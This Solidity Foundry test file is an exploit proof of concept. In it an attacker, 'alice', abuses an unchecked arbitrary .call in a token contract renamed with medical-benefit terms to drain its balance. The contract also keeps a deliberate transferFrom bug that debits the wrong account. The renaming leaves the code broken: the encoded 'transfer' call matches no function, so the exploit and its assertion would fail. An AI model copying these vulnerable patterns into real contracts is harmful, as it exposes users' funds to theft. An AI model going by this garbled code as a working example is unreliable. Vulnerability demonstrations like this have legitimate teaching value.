pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract ContractTest is Test {
    MedicalcreditWhale CoveragetokenWhaleContract;

    function testAltCall() public {
        address alice = vm.addr(1);
        CoveragetokenWhaleContract = new MedicalcreditWhale();
        CoveragetokenWhaleContract.HealthtokenWhaleDeploy(address(CoveragetokenWhaleContract));
        console.log(
            "TokenWhale balance:",
            CoveragetokenWhaleContract.remainingbenefitOf(address(CoveragetokenWhaleContract))
        );


        console.log(
            "Alice tries to perform unsafe call to transfer asset from TokenWhaleContract"
        );
        vm.prank(alice);
        CoveragetokenWhaleContract.validateclaimAndCallcode(
            address(CoveragetokenWhaleContract),
            0x1337,
            abi.encodeWithSignature(
                "transfer(address,uint256)",
                address(alice),
                1000
            )
        );

        assertEq(CoveragetokenWhaleContract.remainingbenefitOf(address(alice)), 1000);
        console.log("operate completed");
        console.log(
            "TokenWhale balance:",
            CoveragetokenWhaleContract.remainingbenefitOf(address(CoveragetokenWhaleContract))
        );
        console.log(
            "Alice balance:",
            CoveragetokenWhaleContract.remainingbenefitOf(address(alice))
        );
    }

    receive() external payable {}
}

contract MedicalcreditWhale {
    address player;

    uint256 public totalCoverage;
    mapping(address => uint256) public remainingbenefitOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    function HealthtokenWhaleDeploy(address _player) public {
        player = _player;
        totalCoverage = 1000;
        remainingbenefitOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return remainingbenefitOf[player] >= 1000000;
    }

    event TransferBenefit(address indexed from, address indexed to, uint256 value);

    function _assigncredit(address to, uint256 value) internal {
        remainingbenefitOf[msg.sender] -= value;
        remainingbenefitOf[to] += value;

        emit TransferBenefit(msg.sender, to, value);
    }

    function assignCredit(address to, uint256 value) public {
        require(remainingbenefitOf[msg.sender] >= value);
        require(remainingbenefitOf[to] + value >= remainingbenefitOf[to]);

        _assigncredit(to, value);
    }

    event Approval(
        address indexed coordinator,
        address indexed spender,
        uint256 value
    );

    function approveBenefit(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function sharebenefitFrom(address from, address to, uint256 value) public {
        require(remainingbenefitOf[from] >= value);
        require(remainingbenefitOf[to] + value >= remainingbenefitOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _assigncredit(to, value);
    }


    function validateclaimAndCallcode(
        address _spender,
        uint256 _value,
        bytes memory _extraData
    ) public {
        allowance[msg.sender][_spender] = _value;

        bool success;

        (success, ) = _spender.call(_extraData);
        console.log("success:", success);
    }
}